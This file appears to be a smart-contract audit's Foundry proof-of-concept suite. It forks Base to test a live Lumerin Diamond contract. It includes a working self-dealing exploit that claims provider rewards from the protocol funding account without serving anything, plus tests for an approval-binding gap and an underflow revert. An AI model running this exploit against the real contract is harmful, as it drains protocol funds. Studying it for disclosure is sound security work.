// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function allowance(address, address) external view returns (uint256);
}

struct Session {
    address user;
    bytes32 bidId;
    uint256 stake;
    bytes closeoutReceipt;
    uint256 closeoutType;
    uint256 providerWithdrawnAmount;
    uint128 openedAt;
    uint128 endsAt;
    uint128 closedAt;
    bool isActive;
    bool isDirectPaymentFromUser;
}

struct FacetCut {
    address facetAddress;
    uint8 action;
    bytes4[] functionSelectors;
}

interface IDiamond {
    function providerRegister(address provider_, uint256 amount_, string calldata endpoint_) external;
    function modelRegister(
        address modelOwner_,
        bytes32 baseModelId_,
        bytes32 ipfsCID_,
        uint256 fee_,
        uint256 amount_,
        string calldata name_,
        string[] calldata tags_
    ) external;
    function postModelBid(address provider_, bytes32 modelId_, uint256 pricePerSecond_) external returns (bytes32);
    function getBidId(address provider_, bytes32 modelId_, uint256 nonce_) external pure returns (bytes32);
    function getModelId(address account_, bytes32 baseModelId_) external pure returns (bytes32);
    function openSession(
        address user_,
        uint256 amount_,
        bool isDirectPaymentFromUser_,
        bytes calldata approvalEncoded_,
        bytes calldata signature_
    ) external returns (bytes32);
    function closeSession(bytes calldata receiptEncoded_, bytes calldata signature_) external;
    function claimForProvider(bytes32 sessionId_) external;
    function getSession(bytes32 sessionId_) external view returns (Session memory);
    function getIsProviderApprovalUsed(bytes memory approval_) external view returns (bool);
    function stakeToStipend(uint256 amount_, uint128 timestamp_) external view returns (uint256);
    function getSessionEnd(uint256 amount_, uint256 pricePerSecond_, uint128 openedAt_) external view returns (uint128);
    function startOfTheDay(uint128 timestamp_) external pure returns (uint128);
    function getFundingAccount() external view returns (address);
    function withdrawUserStakes(address user_, uint8 iterations_) external;
    function diamondCut(FacetCut[] calldata facets_, address init_, bytes calldata initData_) external;
    function getProvider(address provider_)
        external
        view
        returns (string memory, uint256, uint128, uint128, uint256, bool);
}

/// @notice Pinned-block Base fork PoCs against the live Lumerin Diamond.
/// @dev Fork block 59525351. Run: forge test --fork-url https://base-rpc.publicnode.com --fork-block-number 59525351 -vvv
contract DiamondPoC is Test {
    address constant DIAMOND = 0x6aBE1d282f72B474E54527D93b979A4f64d3030a;
    address constant MOR = 0x7431aDa8a591C955a994a21710752EF9b882b8e3;

    IDiamond constant diamond = IDiamond(DIAMOND);
    IERC20 constant mor = IERC20(MOR);

    uint256 constant ATTACKER_PK = 0xA11CE;
    uint256 constant PROVIDER_PK = 0xB0B;
    uint256 constant USER_A_PK = 0xAAAA;
    uint256 constant USER_B_PK = 0xBBBB;

    address attacker;
    address provider;
    address userA;
    address userB;

    error OwnableUnauthorizedAccount(address account);
    error InsufficientRightsForOperation(address delegator, address delegatee);
    error SessionAlreadyClosed();
    error SessionDuplicateApproval();

    function setUp() public {
        vm.createSelectFork("https://base-rpc.publicnode.com", 59525351);
        attacker = vm.addr(ATTACKER_PK);
        provider = vm.addr(PROVIDER_PK);
        userA = vm.addr(USER_A_PK);
        userB = vm.addr(USER_B_PK);
        vm.deal(attacker, 10 ether);
        vm.deal(provider, 10 ether);
        vm.deal(userA, 10 ether);
        vm.deal(userB, 10 ether);
    }

    /* ---------- helpers ---------- */

    /// @dev Register `who` as provider + model + bid. Caller funds `who` with MOR first.
    function _setupBid(address who, uint256 providerStake, uint256 pricePerSecond)
        internal
        returns (bytes32 bidId)
    {
        vm.startPrank(who);
        mor.approve(DIAMOND, type(uint256).max);
        diamond.providerRegister(who, providerStake, "node.example.com:3333");
        bytes32 baseModelId = keccak256("poc-model");
        bytes32 ipfsCID = keccak256("ipfs://poc");
        string[] memory tags = new string[](1);
        tags[0] = "poc";
        diamond.modelRegister(who, baseModelId, ipfsCID, 0, 1 ether, "poc-model", tags);
        bytes32 modelId = diamond.getModelId(who, baseModelId);
        diamond.postModelBid(who, modelId, pricePerSecond);
        vm.stopPrank();
        return diamond.getBidId(who, modelId, 0);
    }

    function _signApproval(uint256 signerPk, bytes32 bidId, address user)
        internal
        view
        returns (bytes memory approval, bytes memory sig)
    {
        approval = abi.encode(bidId, block.chainid, user, uint128(block.timestamp));
        bytes32 digest = keccak256(approval);
        bytes32 ethHash = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", digest));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPk, ethHash);
        sig = abi.encodePacked(r, s, v);
    }

    function _signReceipt(uint256 signerPk, bytes32 sessionId)
        internal
        view
        returns (bytes memory receipt, bytes memory sig)
    {
        receipt = abi.encode(sessionId, block.chainid, uint128(block.timestamp), uint32(1000), uint32(100));
        bytes32 digest = keccak256(receipt);
        bytes32 ethHash = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", digest));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPk, ethHash);
        sig = abi.encodePacked(r, s, v);
    }

    /* ---------- FINDING A (Medium): provider self-deal farms the fundingAccount ---------- */

    /// @notice Attacker is BOTH provider and user. Opens a session against their own bid,
    /// never serves any inference, waits until endsAt, claims from the fundingAccount.
    /// The user's own stake is refunded in full (non-direct mode); the profit is protocol
    /// emissions paid for zero service, capped only by provider stake per 365-day period.
    function testSelfDealFarmsFundingAccount() public {
        uint256 providerStake = 300 ether;
        uint256 userStake = 100_000 ether;
        uint256 pricePerSecond = 1e15; // 0.001 MOR/s

        deal(MOR, attacker, userStake + providerStake + 10 ether);
        bytes32 bidId = _setupBid(attacker, providerStake, pricePerSecond);

        uint256 stipend = diamond.stakeToStipend(userStake, uint128(block.timestamp));
        assertGt(stipend, 0, "zero stipend");
        uint128 endsAt = diamond.getSessionEnd(userStake, pricePerSecond, uint128(block.timestamp));
        uint256 duration = endsAt - uint128(block.timestamp);
        uint256 expectedReward = duration * pricePerSecond;
        assertGe(duration, 300, "session too short");
        assertLe(endsAt - uint128(block.timestamp), 7 days, "exceeds max duration");
        assertLe(expectedReward, providerStake, "reward exceeds provider stake cap");
        assertGt(expectedReward, 0, "no reward");

        address fundingAccount = diamond.getFundingAccount();
        uint256 fundingBefore = mor.balanceOf(fundingAccount);
        uint256 attackerBefore = mor.balanceOf(attacker);

        (bytes memory approval, bytes memory sig) = _signApproval(ATTACKER_PK, bidId, attacker);
        vm.prank(attacker);
        bytes32 sessionId = diamond.openSession(attacker, userStake, false, approval, sig);

        // No inference is ever served. Just wait until the session expires...
        vm.warp(endsAt);

        // ...and claim the provider reward straight from the protocol funding account.
        vm.prank(attacker);
        diamond.claimForProvider(sessionId);

        assertEq(mor.balanceOf(fundingAccount), fundingBefore - expectedReward, "funding not drained");
        assertEq(
            mor.balanceOf(attacker),
            attackerBefore - userStake + expectedReward,
            "attacker did not gain the reward"
        );

        // Close the session (valid self-signed receipt) and recover the user's stake in full.
        (bytes memory receipt, bytes memory receiptSig) = _signReceipt(ATTACKER_PK, sessionId);
        vm.prank(attacker);
        diamond.closeSession(receipt, receiptSig);
        // Day-locked remainder becomes withdrawable the next day.
        uint128 releaseAt = diamond.startOfTheDay(uint128(endsAt)) + 1 days;
        vm.warp(releaseAt + 1);
        vm.prank(attacker);
        diamond.withdrawUserStakes(attacker, 10);

        // Net: attacker kept the farmed reward; the 100k user stake was refunded in full
        // (attackerBefore was measured after setup, so stakes/fees are already accounted for).
        assertEq(mor.balanceOf(attacker), attackerBefore + expectedReward, "final attacker balance mismatch");
        console.log("FARMED from fundingAccount (MOR):", expectedReward / 1 ether);
    }

    /* ---------- FINDING B (Low): provider approval is not bound to its user ---------- */

    /// @notice Provider signs an approval for user A; user B opens a session with it.
    /// `_extractProviderApproval` decodes the user address but discards it, and the
    /// `SessionApprovedForAnotherUser` error is never used. The session is created for B.
    /// Impact is limited because openSession already requires caller == user or delegate,
    /// so this is a missing defense-in-depth check, not a direct theft primitive.
    function testApprovalNotBoundToUser() public {
        uint256 pricePerSecond = 1e10; // min bid price
        deal(MOR, provider, 10 ether);
        bytes32 bidId = _setupBid(provider, 0.2 ether, pricePerSecond);

        deal(MOR, userB, 10_000 ether);
        vm.prank(userB);
        mor.approve(DIAMOND, type(uint256).max);

        // Approval issued by the provider for user A...
        (bytes memory approval, bytes memory sig) = _signApproval(PROVIDER_PK, bidId, userA);

        // ...is accepted to open a session for user B.
        vm.prank(userB);
        bytes32 sessionId = diamond.openSession(userB, 1_000 ether, false, approval, sig);

        Session memory s = diamond.getSession(sessionId);
        assertEq(s.user, userB, "session user mismatch");
        assertTrue(diamond.getIsProviderApprovalUsed(approval), "approval not marked used");
        // The same approval can no longer be used (single-use flag is keyed on the raw bytes).
        vm.prank(userB);
        vm.expectRevert(SessionDuplicateApproval.selector);
        diamond.openSession(userB, 1_000 ether, false, approval, sig);
    }

    /* ---------- FINDING C (Low): claimForProvider underflows after a late close ---------- */

    /// @notice Provider whose claim was capped by their stake at a LATE close cannot call
    /// claimForProvider again until the on-hold window passes: `_getProviderRewards - onHold`
    /// underflows (onHold is computed from closedAt, not capped by endsAt) and reverts.
    function testClaimForProviderRevertsAfterLateClose() public {
        uint256 providerStake = 0.2 ether; // minimum stake -> claim cap binds hard
        uint256 userStake = 100_000 ether;
        uint256 pricePerSecond = 1e16; // 0.01 MOR/s (max bid price)

        deal(MOR, attacker, userStake + providerStake + 10 ether);
        bytes32 bidId = _setupBid(attacker, providerStake, pricePerSecond);

        uint128 endsAt = diamond.getSessionEnd(userStake, pricePerSecond, uint128(block.timestamp));
        uint256 expectedReward = (endsAt - uint128(block.timestamp)) * pricePerSecond;
        assertGt(expectedReward, providerStake, "cap must bind for this PoC");

        (bytes memory approval, bytes memory sig) = _signApproval(ATTACKER_PK, bidId, attacker);
        vm.prank(attacker);
        bytes32 sessionId = diamond.openSession(attacker, userStake, false, approval, sig);

        // Close LATE, at noon two days after the session's end day: on-hold = 12h * pps = 432 MOR
        // while the remaining claimable reward is expectedReward - 0.2 MOR (~280 MOR).
        uint128 closedAt = diamond.startOfTheDay(endsAt) + 2 days + 12 hours;
        vm.warp(closedAt);
        (bytes memory receipt, bytes memory receiptSig) = _signReceipt(ATTACKER_PK, sessionId);
        vm.prank(attacker);
        diamond.closeSession(receipt, receiptSig);
        assertEq(diamond.getSession(sessionId).providerWithdrawnAmount, providerStake, "cap not applied");

        // Same-day claim reverts with a panic underflow (0 - onHold math in claimForProvider).
        vm.prank(attacker);
        vm.expectRevert();
        diamond.claimForProvider(sessionId);

        // One day later the on-hold window has passed and the call succeeds again (pays 0: capped).
        vm.warp(closedAt + 1 days);
        vm.prank(attacker);
        diamond.claimForProvider(sessionId);
        assertEq(diamond.getSession(sessionId).providerWithdrawnAmount, providerStake);
    }

    /* ---------- DISMISSALS (must keep passing: the guards work) ---------- */

    function testDiamondCutRequiresOwner() public {
        vm.prank(attacker);
        vm.expectRevert(abi.encodeWithSelector(OwnableUnauthorizedAccount.selector, attacker));
        diamond.diamondCut(new FacetCut[](0), address(0), "");
    }

    function testCloseNonexistentSessionReverts() public {
        bytes32 fakeSessionId = keccak256("nope");
        bytes memory receipt =
            abi.encode(fakeSessionId, block.chainid, uint128(block.timestamp), uint32(0), uint32(0));
        bytes memory garbageSig = new bytes(65);
        vm.prank(attacker);
        vm.expectRevert(
            abi.encodeWithSelector(InsufficientRightsForOperation.selector, address(0), attacker)
        );
        diamond.closeSession(receipt, garbageSig);
    }

    function testDoubleCloseReverts() public {
        deal(MOR, attacker, 200_000 ether);
        bytes32 bidId = _setupBid(attacker, 300 ether, 1e15);
        (bytes memory approval, bytes memory sig) = _signApproval(ATTACKER_PK, bidId, attacker);
        vm.prank(attacker);
        bytes32 sessionId = diamond.openSession(attacker, 100_000 ether, false, approval, sig);
        (bytes memory receipt, bytes memory receiptSig) = _signReceipt(ATTACKER_PK, sessionId);
        vm.prank(attacker);
        diamond.closeSession(receipt, receiptSig);
        (bytes memory receipt2, bytes memory receiptSig2) = _signReceipt(ATTACKER_PK, sessionId);
        vm.prank(attacker);
        vm.expectRevert(SessionAlreadyClosed.selector);
        diamond.closeSession(receipt2, receiptSig2);
    }
}
